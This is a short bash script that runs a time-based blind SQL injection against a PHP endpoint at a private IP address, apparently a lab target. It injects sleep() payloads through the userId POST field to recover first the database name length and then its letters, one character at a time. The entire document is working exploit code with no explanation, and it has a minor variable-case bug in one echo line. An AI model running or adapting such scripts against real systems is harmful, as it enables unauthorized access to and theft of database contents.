#!/bin/bash

# Loop through numbers 1 to 20 to get Database length
for i in {1..20}; do

    payload="2' AND if(length(database())=$i,sleep(5),1)#"
    echo "Payload is = $payload"

    start_time=$(date +%s)

    curl -X POST http://192.168.44.68:8080/index3.php -d "userId=$payload" > /dev/null

    end_time=$(date +%s)

    time_spent=$((end_time - start_time))

    # Check your condition here
    if [[ $time_spent -gt 4 ]]; then
        echo "Data base length is : $i"
        db_len=$i
        break
    fi
done


# Loop through numbers 1 to dblengh to get Database le

Database_Name=()
for ((i=1; i<=$db_len; i++)); do
    for j in {a..z}; do
        payload="2' AND if(substring(database(),$i,1)='$j',sleep(5),1)#"
        echo "Payload is = $payload"

        start_time=$(date +%s)

        curl -X POST http://192.168.44.68:8080/index3.php -d "userId=$payload" > /dev/null

        end_time=$(date +%s)

        time_spent=$((end_time - start_time))

        # Check your condition here
        if [[ $time_spent -gt 4 ]]; then
            echo "Data base Name is : $J"
            Database_Name+=( $j )
            break
        fi
    done
done

for element in "${Database_Name[@]}"; do
    echo "$element"
done
